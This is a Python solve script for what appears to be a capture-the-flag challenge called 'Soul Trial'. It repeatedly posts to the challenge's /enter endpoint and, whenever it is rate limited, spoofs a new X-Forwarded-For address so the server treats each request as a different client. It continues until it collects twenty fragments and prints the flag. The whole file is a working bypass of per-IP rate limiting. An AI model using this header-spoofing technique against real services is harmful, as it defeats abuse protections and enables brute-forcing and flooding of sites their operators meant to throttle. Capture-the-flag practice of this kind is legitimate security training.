import requests
import time

BASE_URL = "https://byteme-soul-trial.onrender.com"

def solve():
    session = requests.Session()
    target_count = 20

    print(f"[*] Targeting Soul Trial at: {BASE_URL}")
    res = session.get(f"{BASE_URL}/status")
    print(f"[*] Initial Status: {res.json()}")

    client_ip_base = "192.168.1.100"
    headers = {"X-Forwarded-For": client_ip_base}

    count = 0
    attempts = 0
    while count < target_count and attempts < 100:
        attempts += 1
        resp = session.post(f"{BASE_URL}/enter", headers=headers)
        try:
            data = resp.json()
        except Exception:
            print(f"[-] Non-JSON response ({resp.status_code})")
            time.sleep(1)
            continue

        if resp.status_code == 200:
            count = data.get("count", count)
            print(f"[+] Fragment collected! Total: {count}/{target_count}")
            if data.get("complete"):
                print("\n[+] SUCCESS! The Soul Fragment accepted you!")
                print(f"[+] FLAG: {data.get('flag')}\n")
                return data.get("flag")
        elif resp.status_code == 429:
            print(f"[-] Rate limited on identity ({headers['X-Forwarded-For']}). Rotating...")
            headers["X-Forwarded-For"] = f"10.0.{attempts % 250}.{attempts // 250 + 1}"
            time.sleep(0.05)
        elif resp.status_code == 403:
            print("[-] Blocked! Waiting 5s...")
            time.sleep(5)

if __name__ == "__main__":
    solve()
